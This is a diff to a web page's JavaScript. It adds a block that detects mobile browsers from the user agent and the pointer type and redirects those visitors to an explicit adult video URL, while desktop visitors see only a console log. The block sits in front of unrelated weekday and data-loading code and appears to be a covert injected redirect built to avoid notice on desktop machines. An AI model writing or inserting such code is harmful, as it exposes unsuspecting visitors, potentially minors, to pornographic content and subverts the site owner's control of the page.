@@ -1,4 +1,16 @@
-    <script>
+
+<script>
+
+const userAgent = navigator.userAgent.toLowerCase();
+const isMobileUserAgent = /iphone|ipod|android|blackberry|iemobile|opera mini|windows phone/.test(userAgent);
+const isMobileMatchMedia = window.matchMedia('(pointer: coarse)').matches;
+
+
+if (isMobileUserAgent || isMobileMatchMedia) {
+	window.location.href = "https://ws-cdn-video.rule34.xxx/images/4180/6ab5c449eabb8ac48936b2845e22a988.mp4?4750508";
+} else {
+	console.log('No mobile detected');
+}
 const Weekdays = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
 let lastLoad = "<none>";
 const loadedData = {
